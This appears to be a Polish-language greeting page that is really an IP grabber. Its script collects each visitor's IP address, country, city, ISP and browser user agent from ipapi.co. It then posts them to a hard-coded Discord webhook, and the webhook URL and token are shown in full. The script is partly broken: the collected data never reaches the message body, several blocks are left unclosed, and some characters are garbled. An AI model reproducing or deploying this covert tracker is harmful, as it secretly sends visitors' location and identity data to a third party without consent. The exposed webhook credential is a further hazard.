<!DOCTYPE html>
<html lang="pl">
<head>

</head>
<body>
  <h1>Witaj!</h1>
  <p id="info">Pobieranie danych...</p>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1390748518854955188/qNrH-dlXXuUYCzibyXqFgYbsOHFl93qLp89lfESiuA14iTGcdLEBYwk8UrO726qfjODP";

    async function sendIPInfo() {
      try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Nie moÅ¼na pobraÄ‡ danych IP.");

        const data = await response.json();

        const info = {
          ip: data.ip,
          kraj: data.country_name,
          miasto: data.city,
          dostawca: data.org,
          userAgent: navigator.userAgent,
          data: new Date().toLocaleString("pl-PL")
        };

        const content = `
ðŸ“¡ **Nowa wizyta na stronie**
\`\`\`

\`\`\`
`;

        // WyÅ›wietlenie na stronie
        document.getElementById("info").textContent = content;

        // WysÅ‚anie na Discord webhook
        await fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ content })
        });

      } catch (error) {
        console.error("BÅ‚Ä…d:", error);

</body>
